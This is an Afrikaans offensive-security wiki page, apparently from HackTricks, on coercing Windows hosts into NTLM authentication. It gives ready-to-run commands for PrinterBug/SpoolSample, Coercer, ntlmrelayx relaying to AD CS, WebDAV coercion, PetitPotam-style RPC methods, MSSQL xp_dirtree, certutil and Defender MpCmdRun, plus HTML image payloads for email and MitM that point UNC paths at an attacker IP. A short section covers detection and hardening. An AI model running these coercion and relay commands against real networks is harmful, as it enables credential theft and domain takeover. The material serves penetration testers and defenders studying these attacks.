# Dwing NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is ’n **versameling** **remote authentication triggers** wat in C# gekodeer is deur die MIDL compiler te gebruik om 3rd party dependencies te vermy.

## Spooler Service Abuse

As die _**Print Spooler**_-diens **geaktiveer** is, kan jy sommige reeds bekende AD credentials gebruik om die Domain Controller se print server te **versoek** om ’n **opdatering** oor nuwe print jobs en dit eenvoudig te sê om die kennisgewing na ’n spesifieke **stelsel** te **stuur**.\
Let daarop dat wanneer die printer die kennisgewing na arbitrêre stelsels stuur, dit teen daardie **stelsel moet authenticate**. Daarom kan ’n aanvaller die _**Print Spooler**_-diens teen ’n arbitrêre stelsel laat authenticate, en die diens sal die **computer account** in hierdie authentication **gebruik**.

Onder die enjinkap misbruik die klassieke **PrinterBug**-primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die aanvaller open eers ’n printer/server-handle en verskaf dan ’n vals client name in `pszLocalMachine`, sodat die target spooler ’n notification channel **terug na die aanvaller-beheerde host** skep. Daarom is die effek **outbound authentication coercion** eerder as direkte code execution.<sup>[[2]](#references)</sup>\
As jy na **RCE/LPE** in die spooler self soek, kyk na [PrintNightmare](printnightmare.md). Hierdie bladsy fokus op **coercion en relay**.

### Vind Windows Servers op die domain

Gebruik PowerShell om Windows-hosts te lys. Servers is gewoonlik die hoogste-prioriteit-teikens, fokus dus eerste daarop:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
Select-Object -ExpandProperty DNSHostName > servers.txt
```
### Vind Spooler-dienste wat luister

Gebruik @mysmartlogin se (Vincent Le Toux se) effens aangepaste [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te sien of die Spooler Service luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook `rpcdump.py` op Linux gebruik en na die **MS-RPRN**-protokol soek:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Of toets vinnig gashere vanaf Linux met **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
As jy **coercion surfaces** wil **enumerate** eerder as om net te kontroleer of die spooler endpoint bestaan, gebruik **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dit is nuttig omdat die endpoint in EPM slegs vir jou wys dat die print RPC-interface geregistreer is. Dit **waarborg** nie dat elke coercion method met jou huidige privileges bereikbaar is, of dat die host ’n bruikbare authentication flow sal uitstuur nie.

### Vra die service om teen ’n arbitrêre host te authenticate

Jy kan [SpoolSample from the original repository](https://github.com/leechristensen/SpoolSample) compile.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Met **Coercer** kan jy die spooler-koppelvlakke direk teiken en vermy om te raai watter RPC-metode blootgestel word:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Moderne RPC-over-TCP-terugroepe

Moenie aanvaar dat ’n suksesvolle `RpcRemoteFindFirstPrinterChangeNotificationEx`-oproep noodwendig verkeer oor TCP/445 moet genereer nie. **Windows 11 22H2 en later gebruik RPC oor TCP by verstek vir drukkerkommunikasie**; RPC oor named pipes is gedeaktiveer tensy ’n beleid of `RpcUseNamedPipeProtocol=1` dit herstel. Daarom kan legacy SMB-only listeners rapporteer dat die trigger gestuur is, terwyl hulle nooit die terugroep ontvang nie. Microsoft dokumenteer TCP/135 (Endpoint Mapper) plus dinamiese RPC-poorte vir normale drukker-RPC, en organisasies kan hierdie reeks beperk of ’n vaste drukker-RPC-poort kies.<sup>[[10]](#references)</sup>

Huidige **Impacket `ntlmrelayx.py`** sluit ’n RPC relay server en ’n klein Endpoint Mapper in, wat by verstek op TCP/135 geaktiveer is. Hierdie ondersteuning is in Junie 2025 saamgevoeg, spesifiek met ’n gedemonstreerde PrinterBug-to-AD-CS-ketting, wat dit moontlik maak om die geauthentiseerde RPC-terugroep te relay, selfs wanneer die slagoffer nie na SMB/WebDAV terugval nie.<sup>[[11]](#references)</sup>

RPC relay/EPM-ondersteuning word in **Impacket 0.13.0 en later** gelewer. Voordat jy ’n ontbrekende TCP/135-listener debug, verifieer dat ’n ouer verpakte `ntlmrelayx.py` nie uitgevoer word nie; die hulpuitset behoort albei RPC-server-skakelaars te toon.<sup>[[12]](#references)</sup>
```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Soek vir `Setting up RPC Server on port 135` en `RPCD: Received connection` in die relay-uitset. As die RPC-call ’n verwagte fout terugstuur, maar niks die listener bereik nie, kontroleer die slagoffer se print RPC-transportbeleid, outbound filtering, DNS-resolusie en of ’n ander proses reeds TCP/135 gebruik. Maak ook seker dat `ntlmrelayx` nie met `--no-rpc-server` gestart is nie.

### Forseer HTTP in plaas van SMB met WebClient

Op stelsels wat steeds **RPC over named pipes** gebruik (legacy builds of beleidherstelde gedrag), lewer klassieke PrinterBug gewoonlik ’n **SMB**-authentication aan `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay to HTTP targets** of **relay waar SMB signing ontbreek**.\
Relaying **SMB to SMB** word egter dikwels deur **SMB signing** geblokkeer, dus kan operators verkies om eerder **HTTP/WebDAV**-authentication te forseer. Dit is nie ’n fallback vir die RPC-over-TCP-gedrag wat hierbo beskryf word nie.

As die target die **WebClient**-diens gebruik, kan die listener in ’n vorm gespesifiseer word wat maak dat Windows **WebDAV over HTTP** gebruik:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dit is veral nuttig wanneer dit saam met **`ntlmrelayx --adcs`** of ander HTTP relay targets gebruik word, omdat dit vermy om op SMB relayability op die gedwonge verbinding staat te maak. Die belangrike voorbehoud is dat **WebClient aan die gang moet wees** op die slagoffer sodat die HTTP/WebDAV-variant kan werk.

### Kombinasie met Unconstrained Delegation

As ’n aanvaller ’n rekenaar wat vir [Unconstrained Delegation](unconstrained-delegation.md) gekonfigureer is, gekompromitteer het, kan hulle die **printer dwing om te authenticateer** teen daardie rekenaar. Die printer-rekenaarrekening se **TGT** word dan in die geheue op die unconstrained-delegation-host gecache, waar die aanvaller dit kan herwin en hergebruik met [Pass the Ticket](pass-the-ticket.md).

### Opsporing en hardening-notas

Die betroubaarste manier om PrinterBug van ’n DC, PAW of server wat nie druk nie, te verwyder, is om die Spooler te stop en te disable. Waar printing vereis word, harden elke moontlike relay-bestemming (SMB server signing, LDAP signing/channel binding en EPA op HTTP-dienste soos AD CS) eerder as om aan te neem dat die blokkering van TCP/445 op die callback path voldoende is.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
As die gasheer steeds **plaaslike drukwerk** benodig, is ’n nouer beheermaatreël die GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Dit voorkom dat die spooler afgeleë kliëntverbindings (en printer sharing) aanvaar, terwyl die diens plaaslik beskikbaar bly; herbegin die spooler nadat dit toegepas is, en herhaal daarna die MS-RPRN-bereikbaarheidstoetse hierbo.<sup>[[13]](#references)</sup>

Detection behoort ’n geauthentiseerde oproep na MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` te korreleer, veral opnum 62/65 met ’n nie-plaaslike callback-waarde, en ’n onmiddellike uitgaande SMB-, HTTP- of RPC-verbinding vanaf die spooler-gasheer. Stel ’n baseline op vir **interface UUID/opnum en bron-/bestemmingspare**, nie slegs toegang tot `\PIPE\spoolss` nie, omdat huidige print stacks die callback oor RPC-over-TCP kan plaas.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface op dieselfde spooler-pyp; gebruik Coercer om bereikbare metodes op ’n gegewe gasheer te enumerate<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (ook via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: Hierdie metodes aanvaar parameters wat ’n UNC-path kan bevat (bv. `\\attacker\share`). Wanneer dit verwerk word, sal Windows met die masjien-/gebruikerkonteks na daardie UNC authenticate, wat NetNTLM capture of relay moontlik maak.\
Vir spooler abuse bly **MS-RPRN opnum 65** die algemeenste en bes gedokumenteerde primitive, omdat die protokolspesifikasie uitdruklik verklaar dat die server ’n notification channel terug na die kliënt skep wat deur `pszLocalMachine` gespesifiseer word.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN oor \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: die target probeer om die verskafde backup-logpad oop te maak en authenticate na die aanvaller-beheerde UNC.<sup>[[1]](#references)</sup>
- Practical use: coerce Tier 0-assets (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en dit dan na AD CS-endpoints (ESC8/ESC11-scenario’s) of ander geprivilegieerde dienste te relay.<sup>[[1]](#references)</sup>

## PrivExchange

Die `PrivExchange`-aanval is die gevolg van ’n fout wat in die **Exchange Server `PushSubscription`-feature** gevind is. Hierdie feature maak dit moontlik om die Exchange-server deur enige domeingebruiker met ’n mailbox te dwing om oor HTTP na enige kliënt-verskafde gasheer te authenticate.

By verstek loop die **Exchange-diens as SYSTEM** en het dit buitensporige privileges (spesifiek, dit het **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Hierdie fout kan uitgebuit word om die **relaying van inligting na LDAP moontlik te maak en vervolgens die domein se NTDS-databasis te onttrek**. Waar relaying na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om na ander gashere binne die domein te relay en daarteen te authenticate. Suksesvolle exploitation van hierdie aanval verleen onmiddellike toegang tot die Domain Admin met enige geauthentiseerde domeingebruikerrekening.

## Inside Windows

As jy reeds binne die Windows-masjien is, kan jy Windows dwing om met geprivilegieerde rekeninge aan ’n server te connect met:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om die certutil.exe lolbin (Microsoft-signed binary) te gebruik om NTLM authentication af te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-inspuiting

### Via e-pos

As jy die **e-posadres** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil kompromitteer, kan jy eenvoudig vir hom ’n **e-pos met ’n 1x1-prent** stuur, soos:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Wanneer die slagoffer dit oopmaak, probeer Windows om te authenticate.

### MitM

As jy ’n MitM-aanval kan uitvoer en HTML in ’n bladsy wat deur die slagoffer bekyk word kan inject, probeer om ’n image soos die volgende te inject:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Ander maniere om NTLM-authentication af te dwing en te phish


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracking

As jy [NTLMv1 challenges kan capture, lees hier hoe om dit te crack](../ntlm/index.html#ntlmv1-attack).\
_Onthou dat jy, om NTLMv1 te crack, Responder challenge op "1122334455667788" moet stel_



## References

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC connection updates for print in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server and Endpoint Mapper for ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 release](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Allow Print Spooler to accept client connections](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
